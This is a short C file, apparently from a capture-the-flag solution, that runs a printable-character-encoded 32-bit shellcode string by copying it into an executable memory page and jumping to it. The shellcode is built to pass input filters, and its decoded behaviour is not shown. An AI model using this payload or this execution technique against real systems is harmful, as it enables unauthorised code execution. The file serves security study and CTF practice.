
//to demonstrate the input from unusually_printable is valid shellcode,

//it's 32 bit, and pushes the decoded instructions to the stack - so you need -z execstack, thus

//gcc unusually_printable_solve.c -z execstack -m32 -o unusually_printable_solve

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>

char shellcode[] = "`PYj0X40HP[j0X0Y50AO0YO0Y`0Aa0Ya0Ab0Yi0Aj0Yj0Ak0Ym0YnrII0Y70A80Y80A90Y=0Y>0YGQZOyI&t<j0X40P[2YIC?,42AJ@$<?'20'wBIj0X40P[2YJC2AK@?,6$?0'wBJBBAAAuAaEb]Lz]GHgHAZHiLEa_HiPHpgHy\\HMYEaLHYPGlgGqYIANEaNGu]HXgIaqJaCGNk?a~?_????GlsJoCN^UGdsJoCC|tNMBKOGJ_C????Az?C????Gf`Jg_????BLGAw?C????Jk?????BLGAO&";

void main(int argc, char *argv[]) {
    
    char *shellcode_page = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    memcpy(shellcode_page, shellcode, sizeof(shellcode));

    (*(void(*)())shellcode_page)();
}


